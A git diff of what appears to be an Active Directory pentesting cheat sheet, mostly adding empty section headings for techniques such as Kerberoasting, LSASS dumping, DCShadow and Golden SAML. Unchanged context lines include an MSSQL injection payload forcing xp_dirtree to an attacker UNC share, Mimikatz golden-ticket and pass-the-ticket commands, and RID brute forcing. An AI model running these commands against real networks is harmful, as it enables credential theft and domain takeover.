@@ -57,7 +57,7 @@ it is the first version of this repo, many things will be added later, so stay t
     - [CVE-2020-0688](#cve-2020-0688)
   - [MSSQL Server](#mssql-server)
     - [UNC Path Injection](#unc-path-injection)
-    - [SSRP/MC-SQLR Poisoning](#ssrpmcsqlr-poisoning)
+    - [MC-SQLR Poisoning](#mcsqlr-poisoning)
     - [DML, DDL and Logon Triggers](#dml-ddl-and-logon-triggers)
   - [Forest Persistence](#forest-persistence)
     - [DCShadow](#dcshadow)
@@ -131,11 +131,39 @@ allow anyone with creds to connect to any machine and any config
 Add-PswaAuthorizationRule -UsernName * -ComputerName * -ConfigurationName *
 ```
 
+
+## Domain Enumeration
+
+### GPO enumeration
+
+### ACL enumeration
+
+
 ## Local Privilege Escalation
+
+### Kerberoasting
+
+### ASREPRoasting
+
+### DNSAdmin
+
 
 ## Lateral Mouvement
 
+### WMIExec
+
+
 ## Credentials Dumping
+
+### LSASS Dumping
+
+### NTDS Dumping
+
+### DPAPI Dumping
+
+### LSA Dumping
+
+### SAM Dumping
 
 ### Dump Registry Remotely and Directly
 
@@ -267,6 +295,28 @@ lookupsid.py MEGACORP/$user:'$password'@$target 20000
 ```
 the value "20000" in lookupsid is to indicate how many RID will be tested
   
+
+## Pivoting
+
+### SMB Pipes
+
+### SharpSocks
+
+### RDP Tunneling via DVC
+  
+
+## Persistence
+
+### SIDHistory Injection
+
+### AdminSDHolder and SDProp
+
+
+## ACLs and ACEs Abusing
+
+### GenericAll
+
+
 ## Enhanced Security Bypass
 
 ### AntiMalware Scan Interface 
@@ -341,6 +391,15 @@ mimikatz # !-
 
 ## MS Exchange 
 
+### OWA Password Spraying
+
+### GAL and OAB Exfiltration
+
+### PrivExchange
+
+### ProxyLogon
+
+### CVE-2020-0688
 
 
 ## MSSQL Server 
@@ -358,11 +417,19 @@ EXEC master..xp_dirtree \"\\\\192.168.1.33\\\\evil\";
 1'; use master; exec xp_dirtree '\\10.10.15.XX\SHARE';-- 
 ```
 
+### MC-SQLR Poisoning
+
+### DML, DDL and Logon Triggers
+
 
 ## Forest Persistence 
 
+### DCShadow
+
 
 ## Cross Forest Attacks 
+
+### Trust Tickets
 
 ### Using KRBTGT hash 
 
@@ -372,7 +439,8 @@ Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domaine.
 
 Invoke-Mimikatz -Command '"kerberos::ptt C:\path\krb_tgt.kirbi
 ```
-  
+ 
+ 
 ## Azure Active Directory
 
 ### AZ User Enumeration
@@ -385,6 +453,15 @@ this command allow enumeration with MFA (MultiFactor Authentification)
 ```powershell
 Get-MsolUser -EnabledFilter EnabledOnly -MaxResults 50000 | select DisplayName,UserPrincipalName,@{N="MFA Status"; E={ if( $_.StrongAuthenticationRequirements.State -ne $null){ $_. StrongAuthenticationRequirements.State} else { "Disabled"}}} | export-csv mfaresults.csv
 ```
+
+### PowerZure
+
+### Golden SAML
+
+### PassTheCRT
+
+### MSOL Account
+
 
 ## Miscs 
 
